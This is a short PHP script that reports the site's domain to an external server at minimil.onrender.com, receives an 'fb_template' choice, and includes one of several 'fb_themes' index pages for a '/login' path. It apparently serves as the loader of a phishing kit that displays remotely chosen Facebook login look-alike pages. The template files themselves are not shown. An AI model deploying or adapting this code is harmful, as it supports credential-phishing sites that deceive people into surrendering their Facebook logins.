<?php
function makeGetRequest($url, $headers = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    $error = null;
    if (curl_errno($ch)) {
        $error = curl_error($ch);
    }
    
    curl_close($ch);
    
    return [
        'content' => $response,
        'status_code' => $statusCode,
        'error' => $error
    ];
}

echo "<pre>";
echo "Current Domain: " . $_SERVER['HTTP_HOST'] . "\n";
$current_domain = $current_domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
$response_fb = makeGetRequest('https://minimil.onrender.com/api/websites?domain_fb=' . $current_domain . "/login");
$responseData_fb = json_decode($response_fb['content']);
echo "\nResponse from FB API: " . print_r($responseData_fb, true) . "\n";
$page_fb = isset($responseData_fb->data->fb_template) ? $responseData_fb->data->fb_template : '';
$validPages_fb = [
    '1' => 'fb_themes/theme1/index.php',
    '2' => 'fb_themes/theme2/index.php',
    '3' => 'fb_themes/theme3/index.php',
];

if (array_key_exists($page_fb, $validPages_fb) && file_exists($validPages_fb[$page_fb])) {
    include $validPages_fb[$page_fb];
}
?>